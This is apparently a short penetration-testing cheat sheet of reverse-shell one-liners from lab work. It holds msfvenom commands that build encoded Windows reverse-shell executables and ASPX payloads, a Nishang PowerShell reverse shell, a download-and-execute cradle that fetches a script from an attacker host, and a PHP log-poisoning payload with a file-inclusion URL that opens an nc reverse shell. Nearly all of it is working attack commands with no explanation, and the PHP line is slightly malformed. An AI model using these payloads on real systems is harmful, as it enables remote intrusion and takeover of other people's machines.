msfvenom --platform Windows -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=10.8.102.117 LPORT=1234 -f exe -o shell.exe


msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.23 LPORT=1337 -o shell.aspx 


https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy




##Nishang 

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.23 -Port 443

powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')


#### PHP Reverse Shell 

1. Log Poisoning
##
<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 1337)>

##
source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.14.6%209001%20%3E/tmp/f